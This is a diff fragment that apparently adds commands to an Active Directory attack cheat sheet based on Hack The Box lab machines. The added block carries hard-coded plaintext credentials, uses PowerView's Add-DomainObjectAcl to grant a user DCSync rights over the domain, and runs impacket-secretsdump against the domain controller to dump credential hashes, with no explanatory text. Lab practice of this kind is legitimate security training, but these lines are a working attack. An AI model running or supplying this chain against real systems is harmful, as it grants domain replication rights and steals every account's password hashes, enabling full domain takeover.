@@ -437,6 +437,13 @@ $pass =  ConvertTo-SecureString 'pwd' -AsPlaintText -Force
 $cred = New-Object System.Management.Automation.PSCredential('HTB\Herman',$pass)
 Add-DomainGroupMember -Identity 'Backup Adminis' -Members Herman -Credential $cred
 ```
+```
+$SecPassword = ConvertTo-SecureString 's4viatr' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\s4vitar', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity s4vitar -Rights DCSync
+impacket-secretsdump htb.local/s4vitar@10.10.10.161 
+Password:s4viatr
+```
 
 ### Group Policy Object Enumeration
 ```console
